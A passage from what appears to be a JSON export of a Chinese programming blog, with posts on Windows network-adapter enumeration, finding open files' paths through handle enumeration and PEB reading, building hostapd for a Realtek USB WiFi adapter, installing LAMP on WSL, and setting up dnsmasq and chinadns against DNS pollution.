IpAddressList;//该适配器的IPv4地址链表\n    \t\t\tIP_ADDR_STRING GatewayList;//该适配器的网关IPv4地址链表\n    \t\t\tIP_ADDR_STRING DhcpServer;//该适配器的DHCP服务器的IPv4 地址链表\n    \t\t\tBOOL HaveWins;\n    \t\t\tIP_ADDR_STRING PrimaryWinsServer;\n    \t\t\tIP_ADDR_STRING SecondaryWinsServer;\n    \t\t\ttime_t LeaseObtained;\n    \t\t\ttime_t LeaseExpires;\n    \t\t\t} IP_ADAPTER_INFO,*PIP_ADAPTER_INFO;\n    \n    由于可能有多个网卡，因此struct _IP_ADAPTER_INFO* Next字段为一个链表结构指针，由于一个网卡可能有多个IP，因此IP_ADDR_STRING字段应该也是一个链表结构，其信息如下所示：\n    \n    \ttypedef struct _IP_ADDR_STRING\n    \t{\n    \t\t\tstruct _IP_ADDR_STRING* Next;  //指向同类型节点，即下一个IP（如果有多IP的话）\n    \t\t\tIP_ADDRESS_STRING IpAddress;  //IP地址信息\n    \t\t\tIP_MASK_STRING IpMask; //IP子网掩码\n    \t\t\tDWORD Context;// 网络表入口。这个值对应着AddIPAddredd和DeleteIPAddress函数中的NTEContext参数\n    \t} IP_ADDR_STRING;\n\n在基本了解以上信息后，就可以调用GetAdaptersInfo函数来获取相关网卡信息了，其通用的代码如下所示：\n\n    \t\t\t\t\t#include <WinSock2.h>\n    \t\t\t\t\t#include <Iphlpapi.h>\n    \t\t\t\t\t#include <iostream>\n    \t\t\t\t\tusing namespace std;\n    \t\t\t\t\t#pragma comment(lib,\"Iphlpapi.lib\") //需要添加Iphlpapi.lib库\n    \t\t\t\t\tint main(int argc, char* argv[])\n    \t\t\t\t\t{\n    \t\t\t\t\t\t\t//PIP_ADAPTER_INFO结构体指针存储本机网卡信息\n    \t\t\t\t\t\t\tPIP_ADAPTER_INFO pIpAdapterInfo = new IP_ADAPTER_INFO();\n    \t\t\t\t\t\t\t//得到结构体大小,用于GetAdaptersInfo参数\n    \t\t\t\t\t\t\tunsigned long stSize = sizeof(IP_ADAPTER_INFO);\n    \t\t\t\t\t\t\t//调用GetAdaptersInfo函数,填充pIpAdapterInfo指针变量;其中stSize参数既是一个输入量也是一个输出量\n    \t\t\t\t\t\t\tint nRel = GetAdaptersInfo(pIpAdapterInfo,&stSize);\n    \t\t\t\t\t\t\t//记录网卡数量\n    \t\t\t\t\t\t\tint netCardNum = 0;\n    \t\t\t\t\t\t\t//记录每张网卡上的IP地址数量\n    \t\t\t\t\t\t\tint IPnumPerNetCard = 0;\n    \t\t\t\t\t\t\tif (ERROR_BUFFER_OVERFLOW == nRel)\n    \t\t\t\t\t\t\t{\n    \t\t\t\t\t\t\t\t\t//如果函数返回的是ERROR_BUFFER_OVERFLOW\n    \t\t\t\t\t\t\t\t\t//则说明GetAdaptersInfo参数传递的内存空间不够,同时其传出stSize,表示需要的空间大小\n    \t\t\t\t\t\t\t\t\t//这也是说明为什么stSize既是一个输入量也是一个输出量\n    \t\t\t\t\t\t\t\t\t//释放原来的内存空间\n    \t\t\t\t\t\t\t\t\tdelete pIpAdapterInfo;\n    \t\t\t\t\t\t\t\t\t//重新申请内存空间用来存储所有网卡信息\n    \t\t\t\t\t\t\t\t\tpIpAdapterInfo = (PIP_ADAPTER_INFO)new BYTE[stSize];\n    \t\t\t\t\t\t\t\t\t//再次调用GetAdaptersInfo函数,填充pIpAdapterInfo指针变量\n    \t\t\t\t\t\t\t\t\tnRel=GetAdaptersInfo(pIpAdapterInfo,&stSize);    \n    \t\t\t\t\t\t\t}\n    \t\t\t\t\t\t\tif (ERROR_SUCCESS == nRel)\n    \t\t\t\t\t\t\t{\n    \t\t\t\t\t\t\t\t\t//输出网卡信息\n    \t\t\t\t\t\t\t\t\t//可能有多网卡,因此通过循环去判断\n    \t\t\t\t\t\t\twhile (pIpAdapterInfo)\n    \t\t\t\t\t\t\t{\n    \t\t\t\t\t\t\t\t\tcout<<\"网卡数量：\"<<++netCardNum<<endl;\n    \t\t\t\t\t\t\t\t\tcout<<\"网卡名称：\"<<pIpAdapterInfo->AdapterName<<endl;\n    \t\t\t\t\t\t\t\t\tcout<<\"网卡描述：\"<<pIpAdapterInfo->Description<<endl;\n    \t\t\t\t\t\t\t\t\tswitch(pIpAdapterInfo->Type)\n    \t\t\t\t\t\t\t\t\t{\n    \t\t\t\t\t\t\t\t\tcase MIB_IF_TYPE_OTHER:\n    \t\t\t\t\t\t\t\t\t\t\tcout<<\"网卡类型：\"<<\"OTHER\"<<endl;\n    \t\t\t\t\t\t\t\t\t\t\tbreak;\n    \t\t\t\t\t\t\t\t\tcase MIB_IF_TYPE_ETHERNET:\n    \t\t\t\t\t\t\t\t\t\t\tcout<<\"网卡类型：\"<<\"ETHERNET\"<<endl;\n    \t\t\t\t\t\t\t\t\t\t\tbreak;\n    \t\t\t\t\t\t\t\t\tcase MIB_IF_TYPE_TOKENRING:\n    \t\t\t\t\t\t\t\t\t\t\tcout<<\"网卡类型：\"<<\"TOKENRING\"<<endl;\n    \t\t\t\t\t\t\t\t\t\t\tbreak;\n    \t\t\t\t\t\t\t\t\tcase MIB_IF_TYPE_FDDI:\n    \t\t\t\t\t\t\t\t\t\t\tcout<<\"网卡类型：\"<<\"FDDI\"<<endl;\n    \t\t\t\t\t\t\t\t\t\t\tbreak;\n    \t\t\t\t\t\t\t\t\tcase MIB_IF_TYPE_PPP:\n    \t\t\t\t\t\t\t\t\t\t\tprintf(\"PP\\n\");\n    \t\t\t\t\t\t\t\t\t\t\tcout<<\"网卡类型：\"<<\"PPP\"<<endl;\n    \t\t\t\t\t\t\t\t\t\t\tbreak;\n    \t\t\t\t\t\t\t\t\tcase MIB_IF_TYPE_LOOPBACK:\n    \t\t\t\t\t\t\t\t\t\t\tcout<<\"网卡类型：\"<<\"LOOPBACK\"<<endl;\n    \t\t\t\t\t\t\t\t\t\t\tbreak;\n    \t\t\t\t\t\t\t\t\tcase MIB_IF_TYPE_SLIP:\n    \t\t\t\t\t\t\t\t\t\t\tcout<<\"网卡类型：\"<<\"SLIP\"<<endl;\n    \t\t\t\t\t\t\t\t\t\t\tbreak;\n    \t\t\t\t\t\t\t\t\tdefault:\n    \t\t\t\t\tbreak;\n    \t\t\t\t\t\t\t\t\t}\n    \t\t\t\t\t\t\t\t\tcout<<\"网卡MAC地址：\";\n    \t\t\t\t\t\t\t\t\tfor (DWORD i = 0; i < pIpAdapterInfo->AddressLength; i++)\n    \t\t\t\t\t\t\t\t\t\t\tif (i < pIpAdapterInfo->AddressLength-1)\n    \t\t\t\t\t\t\t\t\t\t\t{\n    \t\t\t\t\t\t\t\t\t\t\t\t\tprintf(\"%02X-\", pIpAdapterInfo->Address[i]);\n    \t\t\t\t\t\t\t\t\t\t\t}\n    \t\t\t\t\t\t\t\t\t\t\telse\n    \t\t\t\t\t\t\t\t\t\t\t{\n    \t\t\t\t\t\t\t\t\t\t\t\t\tprintf(\"%02X\\n\", pIpAdapterInfo->Address[i]);\n    \t\t\t\t\t\t\t\t\t\t\t}\n    \t\t\t\t\t\t\t\t\t\t\tcout<<\"网卡IP地址如下：\"<<endl;\n    \t\t\t\t\t\t\t\t\t\t\t//可能网卡有多IP,因此通过循环去判断\n    \t\t\t\t\t\t\t\t\t\t\tIP_ADDR_STRING *pIpAddrString =&(pIpAdapterInfo->IpAddressList);\n    \t\t\t\t\t\t\t\t\t\t\tdo \n    \t\t\t\t\t\t\t\t\t\t\t{\n    \t\t\t\t\t\t\t\t\t\t\t\t\tcout<<\"该网卡上的IP数量：\"<<++IPnumPerNetCard<<endl;\n    \t\t\t\t\t\t\t\t\t\t\t\t\tcout<<\"IP 地址：\"<<pIpAddrString->IpAddress.String<<endl;\n    \t\t\t\t\t\t\t\t\t\t\t\t\tcout<<\"子网地址：\"<<pIpAddrString->IpMask.String<<endl;\n    \t\t\t\t\t\t\t\t\t\t\t\t\tcout<<\"网关地址：\"<<pIpAdapterInfo->GatewayList.IpAddress.String<<endl;\n    \t\t\t\t\t\t\t\t\t\t\t\t\tpIpAddrString=pIpAddrString->Next;\n    \t\t\t\t\t\t\t\t\t\t\t} while (pIpAddrString);\n    \t\t\t\t\t\t\t\t\t\t\tpIpAdapterInfo = pIpAdapterInfo->Next;\n    \t\t\t\t\t\t\t\t\t\t\tcout<<\"--------------------------------------------------------------------\"<<endl;\n    \t\t\t\t\t\t\t}\n    \t\t\t\t\t\t\t\n    \t\t\t\t\t\t\t}\n    \t\t\t\t\t\t\t//释放内存空间\n    \t\t\t\t\t\t\tif (pIpAdapterInfo)\n    \t\t\t\t\t\t\t{\n    \t\t\t\t\t\t\t\t\tdelete pIpAdapterInfo;\n    \t\t\t\t\t\t\t}\n    \t\t\t\t\t\n    \t\t\t\t\t\t\treturn 0;\n    \t\t\t\t\t}","tags":["编程"],"categories":["编程"]},{"title":"获取打开的文件的全路径（2）","url":"/2018/04/12/获取打开的文件的全路径（2)/","content":"\n#### 1、获取打开文件的全路径（2）\n\n搜索进程空间中的所有句柄，获取句柄的文件名即可。\n\n- #####  首先遍历进程寻找打开文件的进程，比如 word.exe 和PowerPoint.exe \n\n\n\tHANDLE hSnapProcess = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);\n\tif (hSnapProcess == INVALID_HANDLE_VALUE)\n\t{\n\t\treturn 1;\n\t}\n\tPROCESSENTRY32W ProcessEntry;\n\tProcessEntry.dwSize = sizeof(ProcessEntry);\n\tBOOL bret = Process32FirstW(hSnapProcess, &ProcessEntry);\n\tWCHAR wszProcessInfo[MAX_PATH] = { 0 };\n\t\n\tdo\n\t{\n\t\tWCHAR Name[MAX_PATH] = { 0 };\n\t\n\t\tif (!lstrcmp(ProcessEntry.szExeFile, L\"POWERPNT.EXE\") | !lstrcmp(ProcessEntry.szExeFile, L\"WINWORD.EXE\"))\n\t\t{\n\t\t\t…….\n\t\t}\n\n- #####  寻找到目标进程以后，获取进程中的句柄\n\n\n 这里利用了未文档化的一个函数\n\nZwQuerySystemInformation，这是ntdll.dll中的函数\n\n\tHMODULE hNtDLL = LoadLibrary(L\"NTDLL.DLL\");\n\tif (!hNtDLL)\n\t{\n\t\treturn 1;\n\t}\n\tZwQuerySystemInformation = (ZWQUERYSYSTEMINFORMATION)GetProcAddress(hNtDLL, \"ZwQuerySystemInformation\");\n\t\n\ttypedef NTSTATUS(WINAPI *ZWQUERYSYSTEMINFORMATION)(unsigned long, PVOID, ULONG, PULONG);\n\tZWQUERYSYSTEMINFORMATION ZwQuerySystemInformation;\n\n函数原型如下：\n\n\tNTSTATUS WINAPI ZwQuerySystemInformation(\n\t  _In_      SYSTEM_INFORMATION_CLASS SystemInformationClass,\n\t  _Inout_   PVOID                    SystemInformation,\n\t  _In_      ULONG                    SystemInformationLength,\n\t  _Out_opt_ PULONG                   ReturnLength\n\t);\n\n SYSTEM_INFORMATION_CLASS结构体如下：\n\n\ttypedef enum _SYSTEMINFOCLASS\n\t{\n\t\tSystemBasicInformation,             // 0x002C\n\t\tSystemProcessorInformation,         // 0x000C\n\t\tSystemPerformanceInformation,       // 0x0138\n\t\tSystemTimeInformation,              // 0x0020\n\t\tSystemPathInformation,              // not implemented\n\t\tSystemProcessInformation,           // 0x00C8+ per process\n\t\tSystemCallInformation,              // 0x0018 + (n * 0x0004)\n\t\tSystemConfigurationInformation,     // 0x0018\n\t\tSystemProcessorCounters,            // 0x0030 per cpu\n\t\tSystemGlobalFlag,                   // 0x0004 (fails if size != 4)\n\t\tSystemCallTimeInformation,          // not implemented\n\t\tSystemModuleInformation,            // 0x0004 + (n * 0x011C)\n\t\tSystemLockInformation,              // 0x0004 + (n * 0x0024)\n\t\tSystemStackTraceInformation,        // not implemented\n\t\tSystemPagedPoolInformation,         // checked build only\n\t\tSystemNonPagedPoolInformation,      // checked build only\n\t\tSystemHandleInformation,            // 0x0004  + (n * 0x0010)\n\t\tSystemObjectTypeInformation,        // 0x0038+ + (n * 0x0030+)\n\t\tSystemPageFileInformation,          // 0x0018+ per page file\n\t\tSystemVdmInstemulInformation,       // 0x0088\n\t\tSystemVdmBopInformation,            // invalid info class\n\t\tSystemCacheInformation,             // 0x0024\n\t\tSystemPoolTagInformation,           // 0x0004 + (n * 0x001C)\n\t\tSystemInterruptInformation,         // 0x0000, or 0x0018 per cpu\n\t\tSystemDpcInformation,               // 0x0014\n\t\tSystemFullMemoryInformation,        // checked build only\n\t\tSystemLoadDriver,                   // 0x0018, set mode only\n\t\tSystemUnloadDriver,                 // 0x0004, set mode only\n\t\tSystemTimeAdjustmentInformation,    // 0x000C, 0x0008 writeable\n\t\tSystemSummaryMemoryInformation,     // checked build only\n\t\tSystemNextEventIdInformation,       // checked build only\n\t\tSystemEventIdsInformation,          // checked build only\n\t\tSystemCrashDumpInformation,         // 0x0004\n\t\tSystemExceptionInformation,         // 0x0010\n\t\tSystemCrashDumpStateInformation,    // 0x0004\n\t\tSystemDebuggerInformation,          // 0x0002\n\t\tSystemContextSwitchInformation,     // 0x0030\n\t\tSystemRegistryQuotaInformation,     // 0x000C\n\t\tSystemAddDriver,                    // 0x0008, set mode only\n\t\tSystemPrioritySeparationInformation,// 0x0004, set mode only\n\t\tSystemPlugPlayBusInformation,       // not implemented\n\t\tSystemDockInformation,              // not implemented\n\t\tSystemPowerInfo,             // 0x0060 (XP only!)\n\t\tSystemProcessorSpeedInformation,    // 0x000C (XP only!)\n\t\tSystemTimeZoneInformation,          // 0x00AC\n\t\tSystemLookasideInformation,         // n * 0x0020\n\t\tSystemSetTimeSlipEvent,\n\t\tSystemCreateSession,    // set mode only\n\t\tSystemDeleteSession,    // set mode only\n\t\tSystemInvalidInfoClass1,   // invalid info class\n\t\tSystemRangeStartInformation,   // 0x0004 (fails if size != 4)\n\t\tSystemVerifierInformation,\n\t\tSystemAddVerifier,\n\t\tSystemSessionProcessesInformation, // checked build only\n\t\tMaxSystemInfoClass\n\t} SYSTEMINFOCLASS, *PSYSTEMINFOCLASS;\n\n这个结构再MSDN上只列举了一部分，这是网上搜索的结构，可以访问http://www.geoffchappell.com/studies/windows/km/ntoskrnl/api/ex/sysinfo/query.htm查看详细的信息，其包含了我们所需要的一个参数SystemHandleInformation  用来获取系统中进程的句柄信息，第二个参数是缓冲区指针，第三个参数是大小，最后一个参数是实际的返回的数据大小。\n传入SystemHandleInformation   将会返回一个SYSTEM_HANDLE_INFORMATION结构，结构如下：\n\n\ttypedef struct _SYSTEM_HANDLE_INFORMATION\n\t{\n\t\tULONG   uCount;\n\t\tSYSTEM_HANDLE aSH[];\n\t} SYSTEM_HANDLE_INFORMATION, *PSYSTEM_HANDLE_INFORMATION;\n\t\n\ttypedef struct _SYSTEM_HANDLE\n\t{\n\t\tULONG  uIdProcess;\n\t\tUCHAR  ObjectType;    // OB_TYPE_* (OB_TYPE_TYPE, etc.)\n\t\tUCHAR  Flags;         // HANDLE_FLAG_* (HANDLE_FLAG_INHERIT, etc.)\n\t\tUSHORT  Handle;\n\t\tPVOID  pObject;\n\t\tACCESS_MASK GrantedAccess;\n\t} SYSTEM_HANDLE, *PSYSTEM_HANDLE;\n\n- ##### 查找句柄对应的进程，获取句柄对应的文件名\n\n\n通过查询返回句柄的进程pid与传入的PID比较。若符合，OpenProcess 打开该进程，DuplicateHanle复制句柄，然后获取句柄的文件名，然后相对路径转换为绝对路径。\n获取句柄的详细信息用到了ZwQueryInformationFile 函数，这个函数同样是一个未文档化的函数，\n\n\tHMODULE hNtDLL = LoadLibrary(L\"NTDLL.DLL\");\n\tif (!hNtDLL)\n\t{\n\t\treturn 1;\n\t}\n\t\n\tZwQueryInformationFile = (ZWQUERYINFORMATIONFILE)GetProcAddress(hNtDLL, \"ZwQueryInformationFile\");\n\t\n\ttypedef NTSTATUS(WINAPI *ZWQUERYINFORMATIONFILE)(HANDLE, PIO_STATUS_BLOCK, PVOID,ULONG, FILE_INFORMATION_CLASS);\n\tZWQUERYINFORMATIONFILE ZwQueryInformationFile;\n\t\n\tNTSTATUS \n\t  ZwQueryInformationFile(\n\t    IN HANDLE  FileHandle,\n\t    OUT PIO_STATUS_BLOCK  IoStatusBlock,\n\t    OUT PVOID  FileInformation,\n\t    IN ULONG  Length,\n\t    IN FILE_INFORMATION_CLASS  FileInformationClass\n\t    );\n\n第一个参数是文件句柄，第二个参数是接收最终完成状态的IO_STATUS_BLOCK结构的指针。第三个参数是存储返回的文件对象的信息，第四个参数是缓冲区大小，第五个参数是文件信息的类型，我们传入FileNameInformation。在这里我们定义了一个结构体 PNM_INFO ，用来存储信息\n\n\ttypedef struct _NM_INFO\n\t{\n\t\tHANDLE  hFile;\n\t\tFILE_NAME_INFORMATION Info;\n\t\tWCHAR Name[MAX_PATH];\n\t} NM_INFO, *PNM_INFO;\n\n第三个成员即为文件名包括路径，不过是相对路径，调用 PathResolve\n 获取绝对路径。到此文件的全路径就获取到了。\n\n\n\n","tags":["编程"],"categories":["编程"]},{"title":"获取打开文件的全路径（1）","url":"/2018/04/12/获取打开的文件的全路径（1）/","content":"\n#### 1、获取打开文件的全路径（1）\n\n方法：获取进程PEB中的命令行参数信息（问题：如果先打开文件比如word.exe再打开文件，会出现获取不到的情况）\n步骤：\n\n- ##### 遍历进程获取打开文件的可执行文件的进程\n\n\n\tHANDLE hSnapProcess = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);\n\tif (hSnapProcess == INVALID_HANDLE_VALUE)\n\t{\n\t\treturn;\n\t}\n\tPROCESSENTRY32W ProcessEntry;\n\tProcessEntry.dwSize = sizeof(ProcessEntry);\n\tBOOL bret = Process32FirstW(hSnapProcess, &ProcessEntry);\n\tWCHAR wszProcessInfo[MAX_PATH] = { 0 };\n\t\n\tdo\n\t{\n\t\tWCHAR Name[MAX_PATH] = { 0 };\n\t\n\t    if (!lstrcmp(ProcessEntry.szExeFile, L\"POWERPNT.EXE\")| !lstrcmp(ProcessEntry.szExeFile, L\"WINWORD.EXE\"))\n\t\t{\n\t\t\tHANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, ProcessEntry.th32ProcessID);\n\t\t\tdo something\n\t\t\tCloseHandle(hProcess);\n\t\t\n\t\t}\n\t\n\t} while (Process32NextW(hSnapProcess, &ProcessEntry));\n\n-  ##### 利用ntdll.dll中一个未公开的函数NtQueryInformationProcess，获取进程信息然后去读对方进程ReadProcessMemory,函数原型如下：\n\n\n\tNTSTATUS WINAPI NtQueryInformationProcess(\n\t  _In_      HANDLE           ProcessHandle,\n\t  _In_      PROCESSINFOCLASS ProcessInformationClass,\n\t  _Out_     PVOID            ProcessInformation,\n\t  _In_      ULONG            ProcessInformationLength,\n\t  _Out_opt_ PULONG           ReturnLength\n\t);\n\n第一个参数是进程句柄，第二个参数是获取的进程的信息类型，这里我们选择ProcessBasicInformation,\nmsdn 的声明如下，会返回一个PEB结构体。\n\n![image-20230704222649697](https://raw.githubusercontent.com/scuzhangzhang/pic/main/img/image-20230704222649697.png)\n\n第三个参数是输出参数，当参数2是ProcessBasicInformation时，会返回一个\nPROCESS_BASIC_INFORMATION 结构，结构如下，\n\n![image-20230704222723161](https://raw.githubusercontent.com/scuzhangzhang/pic/main/img/image-20230704222723161.png)\n\n\n\tstatus = NtQueryInformationProcess(hProcess,\n\t\t\t\t\tProcessBasicInformation,\n\t\t\t\t\t&pbi,\n\t\t\t\t\tsizeof(PROCESS_BASIC_INFORMATION),\n\t\t\t\t\t&ReturnLength);\n- #####  获取到PROCESS_BASIC_INFORMATION结构体以后，由上可以看出的它的第二个成员就是指向进程PEB结构体的指针，此时调用ReadProcessMemory，获取进程PEB，\n\n\n \tReadProcessMemory(hProcess, pbi.PebBaseAddress, &peb, sizeof(PEB), 0)  ReadProcessMemory的函数原型如下：\n \t \n \tBOOL WINAPI ReadProcessMemory(\n \t  _In_  HANDLE  hProcess,\n \t  _In_  LPCVOID lpBaseAddress,\n \t  _Out_ LPVOID  lpBuffer,\n \t  _In_  SIZE_T  nSize,\n \t  _Out_ SIZE_T  *lpNumberOfBytesRead\n \t);\n\n- \n  ##### 通过ReadProcessMemory 获取进程的PEB以后，PEB的结构如下：\n\n\n\ttypedef struct _PEB {\n\t\tBOOLEAN                 InheritedAddressSpace;\n\t\tBOOLEAN                 ReadImageFileExecOptions;\n\t\tBOOLEAN                 BeingDebugged;\n\t\tBOOLEAN                 Spare;\n\t\tHANDLE                  Mutant;\n\t\tPVOID                   ImageBaseAddress;\n\t\tPPEB_LDR_DATA           LoaderData;\n\t\tPRTL_USER_PROCESS_PARAMETERS ProcessParameters;\n\t\tPVOID                   SubSystemData;\n\t\tPVOID                   ProcessHeap;\n\t\tPVOID                   FastPebLock;\n\t\tPPEBLOCKROUTINE         FastPebLockRoutine;\n\t\tPPEBLOCKROUTINE         FastPebUnlockRoutine;\n\t\tULONG                   EnvironmentUpdateCount;\n\t\tPVOID*                  KernelCallbackTable;\n\t\tPVOID                   EventLogSection;\n\t\tPVOID                   EventLog;\n\t\tPPEB_FREE_BLOCK         FreeList;\n\t\tULONG                   TlsExpansionCounter;\n\t\tPVOID                   TlsBitmap;\n\t\tULONG                   TlsBitmapBits[0x2];\n\t\tPVOID                   ReadOnlySharedMemoryBase;\n\t\tPVOID                   ReadOnlySharedMemoryHeap;\n\t\tPVOID*                  ReadOnlyStaticServerData;\n\t\tPVOID                   AnsiCodePageData;\n\t\tPVOID                   OemCodePageData;\n\t\tPVOID                   UnicodeCaseTableData;\n\t\tULONG                   NumberOfProcessors;\n\t\tULONG                   NtGlobalFlag;\n\t\tBYTE                    Spare2[0x4];\n\t\tLARGE_INTEGER           CriticalSectionTimeout;\n\t\tULONG                   HeapSegmentReserve;\n\t\tULONG                   HeapSegmentCommit;\n\t\tULONG                   HeapDeCommitTotalFreeThreshold;\n\t\tULONG                   HeapDeCommitFreeBlockThreshold;\n\t\tULONG                   NumberOfHeaps;\n\t\tULONG                   MaximumNumberOfHeaps;\n\t\tPVOID*                  *ProcessHeaps;\n\t\tPVOID                   GdiSharedHandleTable;\n\t\tPVOID                   ProcessStarterHelper;\n\t\tPVOID                   GdiDCAttributeList;\n\t\tPVOID                   LoaderLock;\n\t\tULONG                   OSMajorVersion;\n\t\tULONG                   OSMinorVersion;\n\t\tULONG                   OSBuildNumber;\n\t\tULONG                   OSPlatformId;\n\t\tULONG                   ImageSubSystem;\n\t\tULONG                   ImageSubSystemMajorVersion;\n\t\tULONG                   ImageSubSystemMinorVersion;\n\t\tULONG                   GdiHandleBuffer[0x22];\n\t\tULONG                   PostProcessInitRoutine;\n\t\tULONG                   TlsExpansionBitmap;\n\t\tBYTE                    TlsExpansionBitmapBits[0x80];\n\t\tULONG                   SessionId;\n\t} PEB, *PPEB;\n如图标红位置为进程的参数信息，再次调用ReadProcessMemory  获取参数信息，\nReadProcessMemory(hProcess, peb.ProcessParameters, &upps, sizeof(RTL_USER_PROCESS_PARAMETERS), 0))\n 其中upps是一个RTL_USER_PROCESS_PARAMETERS 的结构体，定义如下：\n\ttypedef struct _RTL_USER_PROCESS_PARAMETERS\n\t{\n\t\tULONG MaximumLength;\n\t\tULONG Length;\n\t\n\t\tULONG Flags;\n\t\tULONG DebugFlags;\n\t\n\t\tHANDLE ConsoleHandle;\n\t\tULONG ConsoleFlags;\n\t\tHANDLE StandardInput;\n\t\tHANDLE StandardOutput;\n\t\tHANDLE StandardError;\n\t\n\t\tCURDIR CurrentDirectory;\n\t\tUNICODE_STRING DllPath;\n\t\tUNICODE_STRING ImagePathName;\n\t\tUNICODE_STRING CommandLine;\n\t\tPVOID Environment;\n\t\n\t\tULONG StartingX;\n\t\tULONG StartingY;\n\t\tULONG CountX;\n\t\tULONG CountY;\n\t\tULONG CountCharsX;\n\t\tULONG CountCharsY;\n\t\tULONG FillAttribute;\n\t\n\t\tULONG WindowFlags;\n\t\tULONG ShowWindowFlags;\n\t\tUNICODE_STRING WindowTitle;\n\t\tUNICODE_STRING DesktopInfo;\n\t\tUNICODE_STRING ShellInfo;\n\t\tUNICODE_STRING RuntimeData;\n\t\tRTL_DRIVE_LETTER_CURDIR CurrentDirectories[RTL_MAX_DRIVE_LETTERS];\n\t\n\t\tULONG EnvironmentSize;\n\t\tULONG EnvironmentVersion;\n\t    PVOID PackageDependencyData; //8+\n\t    ULONG ProcessGroupId;\n\t   // ULONG LoaderThreads;\n\t} RTL_USER_PROCESS_PARAMETERS, *PRTL_USER_PROCESS_PARAMETERS;\n如上标红位置为命令行信息，UNICODE_STRING同样是一个结构体，定义如下：\n\n\ttypedef struct _UNICODE_STRING \n\t{\n\t    USHORT Length;\n\t    USHORT MaximumLength;\n\t    PWSTR  Buffer;\n\t} UNICODE_STRING;\n\ttypedef UNICODE_STRING *PUNICODE_STRING;\n再次调用ReadProcessMemory获取命令行字符串信息，存入buffer中\n\n\tReadProcessMemory(hProcess, upps.CommandLine.Buffer, buffer, upps.CommandLine.Length, 0); \n\n到这完整的进程命令行信息就获取到了。通过字符串处理就可以得到相应的打开的文件的全路径了 。\n","tags":["编程"],"categories":["编程"]},{"title":"linux usb wifi设置AP 模式","url":"/2017/12/12/linux usb wifi设置AP 模式 /","content":"\n一.问题阐述\n\t\t本文是基于Linux 的ubuntu16.04系统来完成的，usb设备是Realteak 的RTL8188EUS的设备（lsusb看到的），因为ubuntu自带的nl90211无法支持此类设备，所以有两种解决办法。\n\n二.解决办法\n\n\t\t第一种方法是编译8188eu的驱动，这个在github上有，而且有很多解决办法，编译前需要安装相应的头文件和编译环境，如何你能这样解决的话，当然是最好了，如果这样没能解决，编译失败又解决不来的话，可以换第二种方法。\n\t\t第二种方法是编译带8188eu的hostapd来实现，具体实现步骤如下：\n\t\t1.卸载已有的hostapd\n\t\tsudo apt-get autoremove hostapd\n\t\t2.下载带有rtl8188eu的源码。\n\t\twget https://github.com/jenssegers/RTL8188-hostapd/archive/v2.0.tar.gz\n\t\ttar -zxvf v2.0.tar.gz\n\t\t3.编译\n\t\tcd RTL8188-hostapd-2.0/hostapd\n\t\tsudo make\n\t\t4.安装\n\t\tsudo  make install\n\t   此时可能你还是无法创建热点，这是因为ubuntu自带的Nerwork Manager 会对热点的创建产生影响，把无线网卡设置为未托管即可。\n\t   在/etc/NetworkManager/NetworkManager.conf中添加[keyfile]字段，添加内容为：unmanaged-devices=mac:00:23:cd:10:3e:0b ,mac地址改为自己wifi 设备的地址即可，此时应该就可以创建热点了。\n\t   \n\t   参考链接：\n\t   https://jenssegers.com/43/Realtek-RTL8188-based-access-point-on-Raspberry-Pi\n\t   http://os.51cto.com/art/201311/415573.htm","tags":["杂学"],"categories":["杂学"]},{"title":"WIN10 linux 子系统安装lamp","url":"/2017/11/29/WIN10 linux 子系统安装lamp /","content":"\n\n1.换源\n\n    备份原先的源\n    cp /etc/apt/sources.list /etc/apt/sources.list.bak\n    vim /etc/apt/sources.list\n    换成\n    deb http://mirrors.aliyun.com/ubuntu/ trusty main restricted universe multiverse\n    deb http://mirrors.aliyun.com/ubuntu/ trusty-security main restricted universe multiverse\n    deb http://mirrors.aliyun.com/ubuntu/ trusty-updates main restricted universe multiverse\n    deb http://mirrors.aliyun.com/ubuntu/ trusty-proposed main restricted universe multiverse\n    deb http://mirrors.aliyun.com/ubuntu/ trusty-backports main restricted universe multiverse\n    deb-src http://mirrors.aliyun.com/ubuntu/ trusty main restricted universe multiverse\n    deb-src http://mirrors.aliyun.com/ubuntu/ trusty-security main restricted universe multiverse\n    deb-src http://mirrors.aliyun.com/ubuntu/ trusty-updates main restricted universe multiverse\n    deb-src http://mirrors.aliyun.com/ubuntu/ trusty-proposed main restricted universe multiverse\n    deb-src http://mirrors.aliyun.com/ubuntu/ trusty-backports main restricted universe multiverse\n    更新\n    apt-get update\t\n\n2.安装apache2\n\n    apt-get install apache2\n    service apache2 restart \n    在本地浏览器打开localhost 应该可以看到apache2的欢迎界面\n\n\n3.安装php\n\n\t按照ubuntu安装的方法 apt-get install php5是没法用的，不晓得为啥子\n\t我找的解决办法是如下：\n\tapt-get install software-properties-common\n\tadd-apt-repository ppa:ondrej/php\n\tapt-get update\n\tapt-get install php\n\tapt-get install libapache2-mod-php\n\tservice apache2 restart\n4.测试php\n\t\n\t在/var/www/html目录下新建test.php\n\t内容如下：\n\t<?php\n\tphpinfo();\n\t?>\n\t打开localhost/test.php 正常显示则代表成功\n5.至于mysql 的安装，后续再写\n\n\n​\t","tags":["杂学"],"categories":["杂学"]},{"title":"dns污染的解决","url":"/2017/11/15/dns污染的解决/","content":"\ndnsmasq+chinadns+hev-dns-forwarder\n\n1.安装dnsmasq\n\n\t sudo apt-get install dnsmasq\n\t 编辑/etc/dnsmasq.conf \n\t 取消no-resolv前面的注释\n\t server=127.0.0.1#5354\n\n2.安装chindns\n    https://github.com/shadowsocks/ChinaDNS/releases/download/1.3.2/chinadns-1.3.2.tar.gz\n\t解压\n\ttar -zxf chinadns-1.3.2.tar.gz \n\tcd chinadns-1.3.2\n\t./configure\n\tmake\n\tmake install\n\t安装结束后在复制到/usr/local/bin 目录中去（可能已经自动复制到了，确认一下）\n\t运行命令为\n\tchinadns -c /home/pi/Desktop/chinadns-1.3.2/chnroute.txt -s 114.114.114.114,127.0.0.1:5300 -p 5354 -m  & > /dev/null 2>&1\n\n3.安装\n\n\tgit clone https://github.com/aa65535/hev-dns-forwarder\n\tcd hev-dns-forwarder\n\tmake\n\t编译完会在src目录下生成二进制文件，复制到/usr/local/bin目录下\n\t运行命令\n\thev-dns-forwarder\n\n4.加入开机启动项\n\n\t在/etc/rc.local中加入\n\tsudo  hev-dns-forwarder  & > /dev/null 2>&1\n\tsudo chinadns -c /home/pi/Desktop/chinadns-1.3.2/chnroute.txt -s 114.114.114.114,127.0.0.1:5300 -p 5354 -m  & > /dev/null 